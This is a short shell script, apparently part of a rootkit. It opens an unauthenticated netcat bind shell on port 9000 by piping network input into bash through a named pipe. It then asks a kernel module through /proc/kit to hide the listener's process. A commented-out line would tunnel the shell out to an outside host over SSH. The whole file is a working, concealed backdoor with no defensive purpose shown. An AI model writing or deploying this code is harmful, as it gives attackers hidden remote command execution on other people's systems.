#!/bin/sh

#TODO: hide this script

#hide this process
localPort=9000

#assumes module is install first


mkfifo file

nc -l -k "$localPort" < file | bash >file & # uses named pipe
backgroundPID=$!

echo "hidePid $backgroundPID" > /proc/kit

sleep 1
rm file

#ssh -R 9012:localhost:$localPort kit100@shell.cjb.net 

#TODO GET OUTPUT





